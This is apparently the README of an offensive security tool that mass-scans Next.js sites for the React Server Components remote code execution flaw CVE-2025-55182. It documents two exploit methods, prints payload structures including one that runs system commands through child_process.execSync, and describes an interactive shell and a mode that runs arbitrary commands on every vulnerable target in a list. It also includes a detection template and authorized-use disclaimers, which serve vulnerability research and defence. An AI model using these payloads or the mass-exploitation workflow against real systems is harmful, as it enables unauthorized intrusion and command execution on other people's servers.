# RSC Hunter
A high-performance mass vulnerability scanner for CVE-2025-55182, targeting React Server Components (RSC) in Next.js applications. Features advanced detection methods, dual exploit techniques, and an interactive command shell for post-exploitation.

[![CI - Test & Lint](https://github.com/sumanrox/rschunter/actions/workflows/ci.yml/badge.svg)](https://github.com/sumanrox/rschunter/actions/workflows/ci.yml)
## Overview

CVE-2025-55182 is a critical remote code execution vulnerability affecting Next.js applications using React Server Components. The vulnerability stems from unsafe prototype property access during deserialization of the React Flight Protocol, allowing attackers to achieve RCE through prototype pollution chains.

**RSC Hunter** provides comprehensive scanning capabilities with:
- Multi-layered detection (passive, active, error-based)
- Dual exploit methods with automatic fallback
- Mass scanning with concurrent processing
- Interactive shell for vulnerable targets
- Resume/pause capability with state persistence
- Live vulnerability discovery in real-time
- **Nuclei template** for ProjectDiscovery integration

## Features

### Detection Capabilities

**Passive Scanning**
- Content-Type fingerprinting (`text/x-component`)
- React Flight Protocol pattern detection
- Next.js build artifact identification
- Server action header analysis
- Version detection and extraction
- **NEW**: `__NEXT_DATA__` runtime marker detection
- **NEW**: Shodan-identified headers (x-nextjs-prerender, x-nextjs-stale-time)
- **NEW**: x-middleware-rewrite detection (critical exploit condition)
- **NEW**: x-middleware-subrequest header presence
- **NEW**: Enhanced Vary header analysis (RSC, Next-Router-State-Tree)

**Active Fingerprinting**
- RSC header probing (`RSC: 1`)
- Next.js endpoint enumeration
- Webpack chunk detection
- Vary header validation
- React Flight Protocol format detection

**Error-Based Detection**
- **NEW**: REACT2SHELL_PROBE benign marker injection
- Prototype pollution payload injection
- React deserialization error analysis
- Behavioral response fingerprinting
- Works even on hardened targets
- No OS commands executed during detection

### Exploitation

**Dual Exploit Methods**
1. **Primary**: Function constructor injection via chunk references
2. **Fallback**: `__proto__` pollution with `_response._prefix` injection

Both methods automatically attempted with intelligent fallback for maximum reliability.

**Command Execution**
- Execute arbitrary commands on vulnerable targets
- Output extraction via error digest parsing
- Multiple endpoint testing for success

### Interactive Shell

**Single Target Mode**
```bash
python3 rschunter.py --url https://target.com -sh
```

**Mass Scanning Mode**
```bash
python3 rschunter.py targets.txt -sh --threads 20
```

Shell features:
- Live vulnerability discovery updates
- Multi-target switching (`switch` command)
- Target enumeration (`targets` command)
- Background scanning while interacting
- Clean target filtering (only shows vulnerable/errors)

## Installation

### Requirements

- Python 3.7+
- Dependencies:
  - `requests` - HTTP client with retry logic
  - `urllib3` - Connection pooling

### Setup

```bash
# Clone or download the tool
cd rschunter/

# Install dependencies
pip3 install requests urllib3

# Make executable (optional)
chmod +x rschunter.py
```

### Virtual Environment (Recommended)

```bash
python3 -m venv venv
source venv/bin/activate
pip install requests urllib3
```

## Usage

### Basic Scanning

**Single URL**
```bash
python3 rschunter.py --url https://example.com
```

**Multiple targets from file**
```bash
python3 rschunter.py targets.txt
```

**With custom thread count**
```bash
python3 rschunter.py targets.txt --threads 20
```

### Interactive Shell

**Single target with shell**
```bash
python3 rschunter.py --url https://example.com -sh
```

**Mass scan with live shell**
```bash
python3 rschunter.py targets.txt -sh --threads 15
```

Shell commands:
```
rsc[1/5|example.com]> whoami        # Execute command
rsc[1/5|example.com]> targets       # List vulnerable targets
rsc[1/5|example.com]> switch 3      # Switch to target #3
rsc[1/5|example.com]> info          # Show current target
rsc[1/5|example.com]> exit          # Exit shell
```

### Command Execution

**Execute command on all vulnerable targets**
```bash
python3 rschunter.py targets.txt -exec "whoami"
```

**Use placeholder for URL**
```bash
python3 rschunter.py targets.txt -exec "echo Vulnerable: {}"
```

### Resume Capability

**Resume interrupted scan**
```bash
python3 rschunter.py --resume
```

Scan state is automatically saved to `scan_state.json` every 10 targets.

### Output

**Report generation**

Results are automatically saved to:
- `scan_state.json` - Resume state and full results
- `rsc-report.txt` - Human-readable vulnerability report

Custom report filename:
```bash
python3 rschunter.py targets.txt -o custom-report.txt
```

## Nuclei Integration

### Nuclei Template

RSC Hunter includes a comprehensive Nuclei template (`nuclei-template.yaml`) for integration with ProjectDiscovery's vulnerability scanning workflows. The template implements all detection methods in Nuclei's YAML format.

**Features:**
- 5 request layers (passive, active, error-based)
- Multi-matcher logic with confidence levels
- REACT2SHELL_PROBE benign marker detection
- Shodan-identified header checks
- Flight Protocol pattern matching
- Comprehensive extractors for analysis

### Usage with Nuclei

**Single target scan:**
```bash
nuclei -t nuclei-template.yaml -u https://example.com
```

**Multiple targets:**
```bash
nuclei -t nuclei-template.yaml -l targets.txt
```

**Integration with Nuclei workflows:**
```bash
# Scan with all CVE templates including CVE-2025-55182
nuclei -t nuclei-templates/cves/ -t nuclei-template.yaml -l targets.txt

# Scan with specific tags
nuclei -t nuclei-template.yaml -tags nextjs,rce -l targets.txt

# Output to file
nuclei -t nuclei-template.yaml -l targets.txt -o results.txt -json
```

**Nuclei Cloud Platform integration:**
```bash
# Run as part of continuous scanning
nuclei -t nuclei-template.yaml -l assets.txt -cloud-upload
```

### Template Structure

The Nuclei template includes:

**Detection Matchers:**
- `react2shell-probe-confirmed` - High confidence via benign probe
- `rsc-multiple-indicators` - Multiple RSC patterns detected
- `rsc-content-type` - RSC Content-Type header
- `middleware-headers-present` - Critical exploit conditions
- `shodan-indicators` - Shodan-identified headers
- `error-based-detection` - Error pattern analysis
- `flight-protocol-patterns` - React Flight Protocol

**Extractors:**
- Next.js version detection
- Middleware headers extraction
- Vary header analysis
- Error digest extraction
- Flight chunk pattern capture

### Submitting to ProjectDiscovery

The template is ready for submission to the official Nuclei templates repository:

```bash
# Fork nuclei-templates repository
git clone https://github.com/projectdiscovery/nuclei-templates.git
cd nuclei-templates

# Copy template to CVEs directory
cp /path/to/nuclei-template.yaml cves/2025/CVE-2025-55182.yaml

# Create pull request
git checkout -b cve-2025-55182
git add cves/2025/CVE-2025-55182.yaml
git commit -m "Add CVE-2025-55182 Next.js RSC RCE detection template"
git push origin cve-2025-55182
```

**Template Validation:**
```bash
# Validate template syntax
nuclei -t nuclei-template.yaml -validate

# Test against known vulnerable target
nuclei -t nuclei-template.yaml -u http://vulnerable-target.local
```

## Command Reference

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `--url` | Single target URL or domain | - |
| `--input-file` | File with target list (one per line) | - |
| `--threads` | Number of concurrent workers | 10 |
| `--resume` | Resume from saved state | - |
| `-sh, --shell` | Interactive shell mode | disabled |
| `-exec` | Execute command on vulnerable targets | - |
| `-o, --output` | Output report filename | rsc-report.txt |

### Input File Format

```
# Comments start with #
example.com
https://test.example.net
subdomain.example.org:8080

# Blank lines are ignored
api.example.com/path
```

URL normalization:
- Automatically adds `https://` if missing
- Preserves paths and query parameters
- Handles custom ports
- Removes trailing slashes

## Detection Methodology

### Scoring System

The scanner uses weighted confidence scoring (threshold: 50 points):

| Indicator | Points | Description |
|-----------|--------|-------------|
| `text/x-component` | 100 | Definitive RSC response |
| `window.__next_f` | 80 | Next.js flight data |
| x-middleware-subrequest | 50 | **NEW**: Exploit condition header |
| RSC payload structure | 50 | `{"then": "$..."}` format |
| `$L/$@ patterns` | 45 | Flight protocol references |
| React Flight Protocol | 45 | Chunk format match |
| x-middleware-rewrite | 40 | **NEW**: Critical middleware indicator |
| `react-server-dom-webpack` | 30 | RSC library presence |
| x-nextjs-prerender | 30 | **NEW**: Shodan-identified header |
| Vary: RSC | 35 | **NEW**: RSC content negotiation |
| Next-Action header | 35 | Server action support |
| Vary: Next-Router-State-Tree | 30 | **NEW**: App Router presence |
| __NEXT_DATA__ | 25 | **NEW**: Runtime marker |
| x-nextjs-stale-time | 25 | **NEW**: ISR indicator |
| Build artifacts | 25 | `/_next/static/` present |
| Vary: Next-Router-Prefetch | 20 | **NEW**: Prefetch capability |
| Next.js version | 20 | Informational |

### Real-World Attack Surface Analysis

Based on research from the security community (Reddit analysis):

**Shodan Query Results**:
- `"X-Powered-By: Next.js"` → ~756,261 hosts
- `"x-middleware" + "X-Powered-By: Next.js"` → ~1,713 hosts (narrowed)
- Middleware + RSC/Flight headers → ~350 hosts (actual attack surface)
- With port:3000 filter → 15,000+ potentially exposed
- Without port filter → 56,000+ potentially exposed

**Key Findings**:
The vulnerability requires a specific combination of:
1. Certain routes with middleware
2. Specific middleware behavior (`x-middleware-subrequest`)
3. React Server Components enabled
4. Particular App Router flows

**Real-world exploitation is harder than PoCs suggest** - Most Next.js instances are not vulnerable due to missing one or more required conditions.

### REACT2SHELL_PROBE Detection

Advanced benign detection method:

```javascript
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": '{"then": "$B0"}',
  "_response": {
    "_prefix": "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'REACT2SHELL_PROBE'});",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

**Advantages**:
- No OS command execution during detection
- Returns fixed marker (`REACT2SHELL_PROBE`) in digest
- High confidence vulnerability confirmation
- Safe for automated scanning
- Based on actual research and lab testing

### Endpoint Testing

Tested paths:
- `/_next/data` - Standard Next.js data endpoint
- `/spectre-ghost` - Random path (any path works on vulnerable targets)
- `/api/actions` - Common API convention
- `/` - Root path

### Error-Based Detection

Sends minimal proto pollution payload:
```json
{"0": {"then":"$1:__proto__:constructor"}, "1": {}}
```

Analyzes error responses for:
- `SyntaxError: Unexpected token 'function'`
- React chunk parsing errors
- Native code references
- Prototype pollution indicators

## Security & Responsible Use

### Warning

This tool is designed for authorized security testing only. Unauthorized scanning or exploitation may violate:
- Computer Fraud and Abuse Act (CFAA)
- Computer Misuse Act
- Local cybersecurity laws
- Terms of service agreements

### Responsible Disclosure

If you discover vulnerabilities using this tool:
1. Report to the affected organization's security team
2. Allow reasonable time for patching (typically 90 days)
3. Do not publicly disclose details prematurely
4. Follow coordinated disclosure practices

### Legal Use Cases

- Authorized penetration testing
- Bug bounty programs
- Internal security assessments
- Research with explicit permission
- Security training in controlled environments

## Technical Details

### Vulnerability Background

CVE-2025-55182 exploits React's Flight Protocol deserialization:

1. **Prototype Pollution**: Access `__proto__` via chunk references
2. **Function Constructor**: Retrieve `Function` constructor through prototype chain
3. **Code Injection**: Craft payload to execute arbitrary JavaScript
4. **RCE**: Execute system commands via `child_process.execSync`

### Exploit Chain

```
Client Payload → Next.js Action Handler → decodeReplyFromBusboy
→ Chunk Deserialization → Prototype Access (no validation)
→ Function Constructor → Code Execution → Command Output
```

### Payload Structure

**Method 1**: Function constructor injection
```javascript
{"1": 'I["$1:constructor:constructor"]', ...}
```

**Method 2**: `__proto__` pollution (more reliable)
```javascript
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "_response": {
    "_prefix": "var res = process.mainModule.require('child_process').execSync(...)",
    "_formData": {"get": "$1:constructor:constructor"}
  }
}
```

### Patch Status

Fixed in:
- React 19.0.0+ (commit e2fd5dc)
- Next.js 15.1.4+ / 14.2.24+ / 13.5.8+

Patch adds `hasOwnProperty` check:
```javascript
if (hasOwnProperty.call(moduleExports, metadata[NAME])) {
  return moduleExports[metadata[NAME]];
}
```

## References & Research Credits

### Primary Research

- **Suman Roy (@sumanrox)** - RSC Hunter Tool & Detection Methods
  - Repository: https://github.com/sumanrox/rschunter
  - Website: https://sumanroy.in
  - Comprehensive vulnerability scanner with multi-layered detection
  - REACT2SHELL_PROBE benign marker methodology
  - Nuclei template integration

### Security Advisories

- **CVE-2025-55182** - React Server Components RCE
  - NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-55182
  - Severity: Critical (CVSS score pending)
  - Affected: Next.js < 15.1.4, 14.2.24, 13.5.8

- **CVE-2025-66478** - Rejected (Duplicate of CVE-2025-55182)
  - Status: Consolidated into CVE-2025-55182
  - Same behavior, different identifier

### Community Analysis

- **Reddit Security Research** - Real-world attack surface analysis
  - Shodan query narrowing (756K → 1.7K → 350 hosts)
  - Exploit condition requirements documentation
  - Middleware + RSC header correlation analysis

### Vendor Resources

- **Vercel/Next.js** - Official security advisories
  - GitHub Security Advisory
  - Patched versions: 15.1.4, 14.2.24, 13.5.8
  - Migration guides for affected applications

### Additional Research

- **Wiz Security** - Initial disclosure and analysis
- **Palo Alto Networks** - Threat assessment
- **Tenable** - Vulnerability research

## Acknowledgments

**Created by:**
- **Suman Roy** (@sumanrox)
  - GitHub: https://github.com/sumanrox
  - Website: https://sumanroy.in
  - Tool Repository: https://github.com/sumanrox/rschunter

**Special thanks to:**
- **Security research community** for comprehensive CVE-2025-55182 analysis and lab environments
- **ProjectDiscovery** for Nuclei framework enabling community-driven vulnerability detection
- Security researchers who disclosed and analyzed the vulnerability responsibly
- Next.js team for rapid patching and security advisories
- Shodan for enabling real-world attack surface analysis

## Testing

### Run Unit Tests

```bash
python3 test_rschunter.py
```

Tests cover:
- URL parsing and normalization
- Detection methods (passive, active, endpoint)
- State management and resume
- Exploit payload generation
- Interactive shell functionality
- Error handling and edge cases

### Test Coverage

- URL Parser: 8 tests
- State Manager: 4 tests
- RSC Scanner: 3 tests
- Mass Scanner: 1 test
- Scan Result: 1 test

## Performance

### Benchmarks

- Single target scan: ~2-5 seconds
- Mass scan (100 targets, 10 threads): ~30-60 seconds
- Memory usage: ~50-100MB base + ~5MB per thread

### Optimization Tips

1. **Thread Tuning**: Adjust `--threads` based on network bandwidth
   - Fast network: 20-50 threads
   - Standard: 10-20 threads
   - Slow/unstable: 5-10 threads

2. **Resume Points**: Scan state saved every 10 targets for quick recovery

3. **Timeout**: Default 10s per request (configurable in code)

## Troubleshooting

### Common Issues

**Import errors**
```bash
pip3 install requests urllib3
```

**Permission denied**
```bash
chmod +x rschunter.py
```

**Connection timeouts**
- Reduce thread count: `--threads 5`
- Check network connectivity
- Verify target accessibility

**No vulnerabilities found**
- Ensure targets run Next.js with RSC
- Check if targets are patched
- Verify URL format in input file

**Shell not starting**
- Requires `-sh` flag
- Only works with vulnerable targets
- Check detection methods found indicators

## Contributing

Contributions welcome! Areas for improvement:

- Additional detection signatures
- More exploit variations
- Performance optimizations
- Documentation enhancements
- Test coverage expansion

## References

- [CVE-2025-55182 PoC](https://github.com/sumanrox/CVE-2025-55182)
- [React Server Functions](https://react.dev/reference/rsc/server-functions)
- [React Flight Protocol](https://tonyalicea.dev/blog/understanding-react-server-components/)
- [Next.js Security Advisories](https://github.com/vercel/next.js/security/advisories)

## Credits

**CVE Discovery**: Security researchers who identified the vulnerability  
**PoC Reference**: sumanrox/CVE-2025-55182  
**Tool Development**: Spectre

## License

This tool is provided for educational and authorized security testing purposes only. Use responsibly and ethically.

## Changelog

### v2.0.0 (2025-12-06)
- Added interactive shell mode
- Dual exploit methods with fallback
- Enhanced detection (9+ indicators)
- Error-based detection
- Mass scan with live shell
- Multi-target switching
- Background scanning support

### v1.0.0 (2025-12-05)
- Initial release
- Basic scanning functionality
- Resume capability
- Report generation
